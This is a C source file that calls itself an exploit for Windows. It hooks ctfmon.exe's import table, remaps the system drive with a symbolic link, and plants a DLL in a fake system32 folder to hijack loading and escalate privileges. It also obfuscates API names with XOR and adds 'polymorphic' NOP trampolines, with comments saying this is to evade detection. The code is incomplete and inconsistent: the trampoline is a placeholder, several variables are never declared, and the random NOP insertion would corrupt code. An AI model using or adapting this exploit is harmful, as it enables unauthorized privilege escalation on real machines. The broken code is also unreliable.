#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <dbghelp.h>


// Link with DbgHelp.lib for ImageDirectoryEntryToData
#pragma comment(lib, "Dbghelp.lib")

// Define the function pointer for NtCreateSymbolicLinkObject
typedef NTSTATUS (NTAPI *NtCreateSymbolicLinkObject_t)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING    TargetName
);

// Define the function pointer for RtlInitUnicodeString
typedef VOID (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

// XOR encode/decode function
void xor_encode(char* data, size_t length, char key) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key;
    }
}

// Wrapper function to resolve NtCreateSymbolicLinkObject dynamically
NtCreateSymbolicLinkObject_t resolve_NtCreateSymbolicLinkObject() {
    // Encoded string for "NtCreateSymbolicLinkObject"
    char encoded_func[] = { 
        'N'^0xAA, 't'^0xAA, 'C'^0xAA, 'r'^0xAA, 'e'^0xAA, 'a'^0xAA, 't'^0xAA, 'e'^0xAA,
        'S'^0xAA, 'y'^0xAA, 'm'^0xAA, 'b'^0xAA, 'o'^0xAA, 'l'^0xAA, 'i'^0xAA,
        'c'^0xAA, 'L'^0xAA, 'i'^0xAA, 'n'^0xAA, 'k'^0xAA, 'O'^0xAA, 'b'^0xAA,
        'j'^0xAA, 'e'^0xAA, 'c'^0xAA, 't'^0xAA, '\0' 
    };
    size_t len = sizeof(encoded_func);
    
    // Create a buffer to decode the string without modifying the original
    char decoded_func[sizeof(encoded_func)];
    memcpy(decoded_func, encoded_func, sizeof(encoded_func));
    
    // Decode
    xor_encode(decoded_func, len, 0xAA);
    
    // Ensure null termination
    decoded_func[len - 1] = '\0';
    
    // Debug: Display the decoded string
    printf("[DEBUG] Decoded NtCreateSymbolicLinkObject: %s\n", decoded_func);
    
    // Get handle to ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get handle to ntdll.dll: %lu\n", GetLastError());
        return NULL;
    }
    printf("[DEBUG] ntdll.dll handle: %p\n", (void*)ntdll);
    
    // Resolve the API dynamically
    NtCreateSymbolicLinkObject_t NtCreateSymLink = 
        (NtCreateSymbolicLinkObject_t)GetProcAddress(ntdll, decoded_func);
    
    if (!NtCreateSymLink) {
        printf("[-] Failed to resolve NtCreateSymbolicLinkObject\n");
    }
    
    // Re-encode to avoid detection after resolution
    xor_encode(decoded_func, len, 0xAA);
    
    return NtCreateSymLink;
}

// Wrapper function to resolve RtlInitUnicodeString dynamically
RtlInitUnicodeString_t resolve_RtlInitUnicodeString() {
    // Encoded string for "RtlInitUnicodeString"
    char encoded_func[] = { 
        'R'^0xAA, 't'^0xAA, 'l'^0xAA, 'I'^0xAA, 'n'^0xAA, 'i'^0xAA, 't'^0xAA,
        'U'^0xAA, 'n'^0xAA, 'i'^0xAA, 'c'^0xAA, 'o'^0xAA, 'd'^0xAA, 'e'^0xAA,
        'S'^0xAA, 't'^0xAA, 'r'^0xAA, 'i'^0xAA, 'n'^0xAA, 'g'^0xAA, '\0' 
    };
    size_t len = sizeof(encoded_func);
    
    // Create a buffer to decode the string without modifying the original
    char decoded_func[sizeof(encoded_func)];
    memcpy(decoded_func, encoded_func, sizeof(encoded_func));
    
    // Decode
    xor_encode(decoded_func, len, 0xAA);
    
    // Ensure null termination
    decoded_func[len - 1] = '\0';
    
    // Debug: Display the decoded string
    printf("[DEBUG] Decoded RtlInitUnicodeString: %s\n", decoded_func);
    
    // Get handle to ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get handle to ntdll.dll: %lu\n", GetLastError());
        return NULL;
    }
    printf("[DEBUG] ntdll.dll handle: %p\n", (void*)ntdll);
    
    // Resolve the API dynamically
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = 
        (RtlInitUnicodeString_t)GetProcAddress(ntdll, decoded_func);
    
    if (!RtlInitUnicodeString_ptr) {
        printf("[-] Failed to resolve RtlInitUnicodeString\n");
    }
    
    // Re-encode to avoid detection after resolution
    xor_encode(decoded_func, len, 0xAA);
    
    return RtlInitUnicodeString_ptr;
}

// Global declarations
UNICODE_STRING s;
HANDLE h;

// Function to get the current DOS device path
void get_current_dos_device(int size, char *current_device_path) {
    char current_directory[0x100];
    char current_volume[0x100];
    char current_dos_device[0x100];
    char final_path[0x200];

    // Get current directory
    if (GetCurrentDirectoryA(sizeof(current_directory), current_directory) == 0) {
        fprintf(stderr, "GetCurrentDirectory failed with error: %lu\n", GetLastError());
        return;
    }

    // Get current volume (e.g., "C:")
    strncpy_s(current_volume, sizeof(current_volume), current_directory, 2);
    current_volume[2] = '\0';

    // Get current device
    if (QueryDosDeviceA(current_volume, current_dos_device, sizeof(current_dos_device)) == 0) {
        fprintf(stderr, "QueryDosDeviceA failed with error: %lu\n", GetLastError());
        return;
    }

    // Build final path
    strncpy_s(final_path, sizeof(final_path), current_dos_device, sizeof(final_path) - 1);
    strncat_s(final_path, sizeof(final_path), current_directory + 2, sizeof(final_path) - strlen(final_path) - 1);

    // Return the device path name
    strncpy_s(current_device_path, size, final_path, size - 1);
    current_device_path[size - 1] = '\0';
}

// Function to convert ASCII to Unicode
void ascii_to_unicode(char *ascii, wchar_t *unicode) {
    size_t len = strlen(ascii) + 1;
    for (size_t i = 0; i < len; i++) {
        unicode[i] = (wchar_t)ascii[i];
    }
}

// Function to find the IAT entry for a given function
void* get_iat_entry_main_module(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(NULL); // NULL retrieves handle to the main module (ctfmon.exe)
    if (!hModule) {
        printf("[-] Failed to get handle to the main module.\n");
        return NULL;
    }

    ULONG size = 0;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
        hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);
    if (!importDesc) {
        printf("[-] No import directory found.\n");
        return NULL;
    }

    while (importDesc->Name) {
        const char* importModule = (const char*)((BYTE*)hModule + importDesc->Name);
        if (_stricmp(importModule, moduleName) == 0) { // e.g., "rpcrt4.dll"
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
            while (thunk->u1.Function) {
                FARPROC* func = (FARPROC*)&thunk->u1.Function;
                FARPROC targetFunc = GetProcAddress(GetModuleHandleA(moduleName), functionName);
                if (*func == targetFunc) {
                    return func;
                }
                thunk++;
            }
        }
        importDesc++;
    }
    return NULL;
}



// Function to replace placeholders in the trampoline
int replace_trampoline_value(char *shellcode, unsigned int size, unsigned __int64 original_value, unsigned __int64 value) {
    for (unsigned int pos = 0; pos < (size - sizeof(unsigned __int64)); pos += sizeof(unsigned __int64)) {
        if (*(unsigned __int64*)(shellcode + pos) == original_value) {
            *(unsigned __int64*)(shellcode + pos) = value;
            return 1; // Success
        }
    }
    return 0; // Failure
}

// Function to generate a polymorphic trampoline
void generate_polymorphic_trampoline(char *trampoline, size_t size, char key) {
    // XOR encode
    xor_encode(trampoline, size, key);

    // Add random NOPs for polymorphism
    for (size_t i = 0; i < size; ++i) {
        if (rand() % 10 < 2) { // 20% chance
            trampoline[i] = 0x90; // NOP
        }
    }

    // Decode before use
    xor_encode(trampoline, size, key);
}

// Function to execute custom code (remapping system drive)
void remap_system_drive(void) {
    Sleep(1000); // Wait for "ctfmon.exe" to appear

    // Resolve RtlInitUnicodeString dynamically
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_RtlInitUnicodeString();
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Failed to resolve RtlInitUnicodeString\n");
        return;
    }

    // Initialize UNICODE_STRING for the target
    wchar_t targetPath[] = L"\\??\\C:\\NewSymbolicLink";
    RtlInitUnicodeString_ptr(&s, targetPath);

    // Initialize OBJECT_ATTRIBUTES using the provided macro
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &s, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Create the symbolic link
    NtCreateSymbolicLinkObject_t NtCreateSymLink = resolve_NtCreateSymbolicLinkObject();
    if (!NtCreateSymLink) {
        fprintf(stderr, "Failed to resolve NtCreateSymbolicLinkObject\n");
        return;
    }

    NTSTATUS status = NtCreateSymLink(&h, 0xF0001, &objAttr, &s);
    if (status == 0) { // STATUS_SUCCESS
        printf("[+] Symbolic Link Created: Handle : %p\n", (void*)h);
    } else {
        fprintf(stderr, "NtCreateSymbolicLinkObject failed with status: 0x%X\n", status);
    }
}
// Function to replace the IAT entry with the hook
BOOL hook_iat_entry(void** IAT_entry, void* hookFunction, void** originalFunction) {
    DWORD oldProtect;
    if (!VirtualProtect(IAT_entry, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }

    *originalFunction = *IAT_entry; // Save original function pointer
    *IAT_entry = hookFunction;       // Hook to trampoline

    if (!VirtualProtect(IAT_entry, sizeof(void*), oldProtect, &oldProtect)) {
        printf("[-] VirtualProtect restore failed: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {
    char buffer[0x100];
    char current_dos_device[0x100];
    char current_dos_device_w[0x200];
    char system_directory[0x100];
    char drive_to_remap[16];
    char device_to_remap[16];
    char device_to_remap_w[16];
    void **Ndr64AsyncClientCall_IAT;
    void *Ndr64AsyncClientCall;
    void *hook;
    unsigned __int64 RBX;
    UNICODE_STRING drive;
    HANDLE event;
    DWORD oldp;
    int ret;

    // Resolve NtCreateSymbolicLinkObject
    NtCreateSymbolicLinkObject = (int(*)(HANDLE *, int, void *, UNICODE_STRING *)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) {
        printf("[-] Failed to resolve NtCreateSymbolicLinkObject.\n");
        return 1;
    }

    // Create event object
    event = CreateEvent(NULL, FALSE, FALSE, "ctfmon_owned");
    if (!event) {
        printf("[-] CreateEvent failed: %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory for the trampoline
    hook = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!hook) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }
    memset(hook, 0, 0x1000);

    // Define unique placeholders (ensure these are unique values)
    #define PLACEHOLDER_RBX 0x1111111111111111
    #define PLACEHOLDER_ORIG_FUNC 0x2222222222222222
    #define PLACEHOLDER_CUSTOM_FUNC 0x3333333333333333
    #define PLACEHOLDER_RBX_RESTORE 0x4444444444444444

    // Initialize trampoline with placeholders (as shown earlier)
    // [Trampoline initialization code here...]

    // Replace placeholders with actual addresses
    if (!replace_trampoline_value(trampoline, trampoline_size, PLACEHOLDER_RBX, (unsigned __int64)&RBX)) {
        printf("[-] Failed to replace PLACEHOLDER_RBX.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, PLACEHOLDER_ORIG_FUNC, (unsigned __int64)Ndr64AsyncClientCall)) {
        printf("[-] Failed to replace PLACEHOLDER_ORIG_FUNC.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, PLACEHOLDER_CUSTOM_FUNC, (unsigned __int64)remap_system_drive)) {
        printf("[-] Failed to replace PLACEHOLDER_CUSTOM_FUNC.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, PLACEHOLDER_RBX_RESTORE, (unsigned __int64)&RBX)) {
        printf("[-] Failed to replace PLACEHOLDER_RBX_RESTORE.\n");
    }

    // Copy the trampoline into the allocated memory
    memcpy(hook, trampoline, trampoline_size);

    // Change memory protection to execute
    if (!VirtualProtect(hook, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(hook, 0, MEM_RELEASE);
        return 1;
    }

    // Get the current DOS device path
    get_current_dos_device(sizeof(current_dos_device), current_dos_device);
    printf("[+] Current pathname: %s\n", current_dos_device);

    // Convert to Unicode
    ascii_to_unicode(current_dos_device, current_dos_device_w);

    // Initialize UNICODE_STRING for OBJECT_ATTRIBUTES
    s.Length = strlen(current_dos_device) * 2;
    s.MaximumLength = s.Length + 2;
    s.Buffer = (PWSTR)current_dos_device_w;

    // Get the system directory
    GetSystemDirectory(system_directory, sizeof(system_directory));

    // Get the drive to remap (e.g., "C:")
    strncpy(drive_to_remap, system_directory, 2);
    drive_to_remap[2] = '\0';

    // Get the device to remap (e.g., "\\??\\C:")
    sprintf(device_to_remap, "\\??\\%s", drive_to_remap);

    // Convert to Unicode
    ascii_to_unicode(device_to_remap, device_to_remap_w);

    // Initialize UNICODE_STRING for the drive
    drive.Length = strlen(device_to_remap) * 2;
    drive.MaximumLength = drive.Length + 2;
    drive.Buffer = (PWSTR)device_to_remap_w;

    // Initialize OBJECT_ATTRIBUTES
    info[0] = (char*)0x30;
    info[1] = (char*)0;
    info[2] = (char*)&drive;
    info[3] = (char*)0x40;
    info[4] = (char*)buffer;
    info[5] = (char*)0;

    memset(buffer, 0, sizeof(buffer));
    *((unsigned __int64*)(buffer + 0x00)) = 0xc0001; // Flags

    // Execute ctfmon.exe to initialize DLLs
    ShellExecute(0x0, "open", "ctfmon.exe", "", NULL, SW_SHOW);

    // Get the address of Ndr64AsyncClientCall
    Ndr64AsyncClientCall = GetProcAddress(GetModuleHandle("rpcrt4.dll"), "Ndr64AsyncClientCall");
    printf("[+] Ndr64AsyncClientCall: %p\n", Ndr64AsyncClientCall);

    // Find IAT entry in main module (ctfmon.exe)
    Ndr64AsyncClientCall_IAT = (void*)get_iat_entry_main_module("rpcrt4.dll", "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall_IAT) {
        printf("[-] Failed to locate IAT entry for Ndr64AsyncClientCall.\n");
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall_IAT: %p\n", Ndr64AsyncClientCall_IAT);

    // Hook the IAT entry
    void* Original_Ndr64AsyncClientCall = NULL;
    if (!hook_iat_entry((void**)Ndr64AsyncClientCall_IAT, hook, &Original_Ndr64AsyncClientCall)) {
        printf("[-] Failed to hook IAT entry.\n");
        return 1;
    }

    // User message
    printf("[+] Launching exploit...\n");

    // Create directories
    if (CreateDirectory(".\\windows", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Create System32 subdirectory
        CreateDirectory(".\\windows\\system32", NULL);
    } else {
        printf("[-] Error: the exploit doesn't have permissions to create a directory.\n");
        return 1;
    }

    // Copy the DLL to System32
    if (!CopyFile(".\\MsCtfMonitor.dll", ".\\windows\\system32\\MsCtfMonitor.dll", FALSE)) {
        printf("[-] Error copying 'MsCtfMonitor.dll' to '.\\windows\\system32'.\n");
        return 1;
    }

    // Execute the target program
    ShellExecute(0x0, "open", "ctfmon.exe", "/?", NULL, SW_SHOW);

    // Wait for the DLL to be loaded via the event
    printf("[+] Waiting for DLL hijacking...\n");
    ret = WaitForSingleObject(event, 10000);
    if (ret != WAIT_OBJECT_0) {
        printf("[-] WaitForSingleObject timed out or failed.\n");
    }

    // Close the handle for remapping "C:"
    CloseHandle(h);

    // Unhook the IAT entry
    VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldp);
    *Ndr64AsyncClientCall_IAT = Original_Ndr64AsyncClientCall;
    VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldp, &oldp);

    // Final message
    printf("[+] Exploit successful!\n");
    return 0;
}
